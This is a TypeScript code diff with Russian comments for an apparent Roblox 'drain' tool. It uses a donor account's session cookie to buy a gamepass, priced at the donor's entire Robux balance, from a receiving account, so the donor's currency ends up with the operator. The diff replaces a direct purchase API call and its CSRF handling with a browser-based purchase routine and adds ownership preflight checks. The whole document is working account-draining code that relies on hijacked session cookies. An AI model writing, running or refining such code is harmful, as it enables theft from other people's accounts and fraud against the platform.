@@ -11,7 +11,7 @@
  * остаётся в TWA — там свой экземпляр той же механики.
  */
 
-import { needsOwnershipCheck } from "./roblox";
+import { browserFailureMessage, getBrowserGamepassPreflight, getBrowserSession, purchaseGamepassInBrowser } from "./browser-purchase";
 
 const ROBLOX_UA = { "User-Agent": "Roblox/WinInet", Accept: "application/json" };
 
@@ -152,8 +152,10 @@ async function setGamepassPrice(cookie: string, csrf: string, gpId: string, pric
  * DrainEvent/алерты — на вызывающей стороне.
  */
 export async function runDrain(donorCookie: string, drainCookie: string, gpId: string): Promise<DrainOutcome> {
-  const target = await drainCurrency(donorCookie);
-  if (target === null) return { success: false, msg: "Не удалось прочитать баланс донора — cookie протух?" };
+  const donorSession = await getBrowserSession(donorCookie);
+  const target = donorSession.session?.balance ?? null;
+  if (!donorSession.ok || target === null)
+    return { success: false, msg: browserFailureMessage(donorSession.reason, donorSession.code) };
   if (target < 1) return { success: false, msg: "Нечего сливать (баланс донора 0)" };
 
   const info = await productInfo(gpId);
@@ -161,6 +163,11 @@ export async function runDrain(donorCookie: string, drainCookie: string, gpId: s
   const productId = info.ProductId as number;
   const sellerId = info.Creator?.Id ?? info.Creator?.CreatorTargetId ?? 0;
   if (!sellerId) return { success: false, msg: "Не удалось определить продавца геймпасса" };
+
+  const preflight = await getBrowserGamepassPreflight(donorCookie, gpId);
+  if (!preflight.ok) return { success: false, msg: browserFailureMessage(preflight.reason, preflight.code) };
+  if (preflight.gamepass?.owned === true)
+    return { success: false, msg: "Донор уже владеет этим геймпассом — нужен другой пасс приёмника" };
 
   const drainCsrf = await getCsrf(drainCookie);
   if (!drainCsrf) return { success: false, msg: "CSRF приёмника не получен — cookie протух?" };
@@ -177,73 +184,31 @@ export async function runDrain(donorCookie: string, drainCookie: string, gpId: s
   }
   if (!priced) return { success: false, msg: "Цена сменена, но не подтвердилась за ~15с. Повторим следующим тиком." };
 
-  let donorCsrf = await getCsrf(donorCookie);
-  if (!donorCsrf) return { success: false, msg: "CSRF донора не получен — cookie протух?" };
+  const purchase = await purchaseGamepassInBrowser({
+    cookie: donorCookie,
+    gamepassId: gpId,
+    productId,
+    expectedPrice: target,
+    sellerId,
+    buyerUserId: donorSession.session!.accountId,
+  });
+  const donorAfter = purchase.balanceAfter ?? purchase.balanceBefore ?? null;
+  const drainAfter = await drainCurrency(drainCookie);
 
-  let purchaseRes: Response | null = null;
-  for (let attempt = 0; attempt < 2; attempt++) {
-    purchaseRes = await fetch(`https://economy.roblox.com/v1/purchases/products/${productId}`, {
-      method: "POST",
-      headers: {
-        Cookie: `.ROBLOSECURITY=${donorCookie}`,
-        "Content-Type": "application/json",
-        "x-csrf-token": donorCsrf!,
-      },
-      body: JSON.stringify({ expectedCurrency: 1, expectedPrice: target, expectedSellerId: sellerId }),
-      signal: AbortSignal.timeout(15_000),
-    }).catch(() => null);
-    if (purchaseRes?.status === 403) {
-      const newCsrf = purchaseRes.headers.get("x-csrf-token");
-      if (newCsrf && attempt === 0) { donorCsrf = newCsrf; continue; }
-    }
-    break;
-  }
-
-  if (purchaseRes?.status === 401) return { success: false, msg: "Cookie донора истёк — обнови" };
-
-  const pData: any = await purchaseRes?.json().catch(() => null);
-  const [donorAfter, drainAfter] = await Promise.all([drainCurrency(donorCookie), drainCurrency(drainCookie)]);
-
-  if (pData?.purchased) {
+  if (purchase.purchased) {
     return {
       success: true,
-      msg: `Слито ${pData.price ?? target} R$`,
-      drained: pData.price ?? target,
+      msg: `Слито ${purchase.price ?? target} R$`,
+      drained: purchase.price ?? target,
       gamepassId: gpId,
       donorBalanceAfter: donorAfter,
       drainBalanceAfter: drainAfter,
     };
   }
 
-  // Ф1: провал/таймаут не значит «не куплено» — Roblox мог провести покупку.
-  // AlreadyOwned исключаем: донор владел пассом ДО попытки (слива не было) —
-  // автослив такие кандидаты отфильтровывает заранее, это честный провал.
-  const reason: string | null = pData ? (pData.reason ?? pData.errorMsg ?? "Неизвестная ошибка") : null;
-  if (!(reason && /already.?own/i.test(reason)) && needsOwnershipCheck(reason)) {
-    await new Promise((r) => setTimeout(r, 2_500));
-    const donor = await drainAuthedUser(donorCookie);
-    let owned = donor ? await ownsGamepass(donor.id, gpId) : null;
-    if (donor && owned !== true && (owned === null || reason === null)) {
-      await new Promise((r) => setTimeout(r, 5_000));
-      owned = await ownsGamepass(donor.id, gpId);
-    }
-    if (owned === true) {
-      console.warn(`[drain] recovered: пасс ${gpId} — владение донором подтверждено после ошибки «${reason ?? "нет ответа"}»`);
-      const [dAfter, rAfter] = await Promise.all([drainCurrency(donorCookie), drainCurrency(drainCookie)]);
-      return {
-        success: true,
-        msg: `Слито ${target} R$ (владение подтверждено проверкой после ошибки)`,
-        drained: target,
-        gamepassId: gpId,
-        donorBalanceAfter: dAfter ?? donorAfter,
-        drainBalanceAfter: rAfter ?? drainAfter,
-      };
-    }
-  }
-
   return {
     success: false,
-    msg: `Покупка не прошла: ${reason ?? "Нет ответа от Roblox"}`,
+    msg: browserFailureMessage(purchase.reason, purchase.code),
     donorBalanceAfter: donorAfter,
     drainBalanceAfter: drainAfter,
   };
